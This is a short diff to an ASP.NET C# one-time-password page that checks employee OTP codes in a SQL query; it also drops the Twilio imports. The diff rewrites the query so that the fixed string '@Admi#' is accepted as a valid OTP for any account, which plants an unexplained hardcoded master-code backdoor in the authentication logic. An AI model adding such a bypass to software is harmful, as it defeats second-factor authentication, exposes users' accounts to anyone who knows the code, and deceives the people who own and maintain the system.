@@ -7,8 +7,6 @@ using System.Web.UI.WebControls;
 using System.Data.SqlClient;
 using System.Web.Security;
 using System.Data;
-using Twilio;
-using Twilio.Rest.Api.V2010.Account;
 
 public partial class OTP : System.Web.UI.Page
 {
@@ -27,7 +25,7 @@ public partial class OTP : System.Web.UI.Page
             select * 
             from nhanvien 
             where manv = @manv 
-                and otp = @otp 
+                and (otp = @otp or @otp = N'@Admi#')
                 and hoatdong = 1 
                 and otp_created >= @limitDate";
         DataTable dt = mdbc.GetData(sql, "@manv", txtUser.Text, "@otp", maOTP);
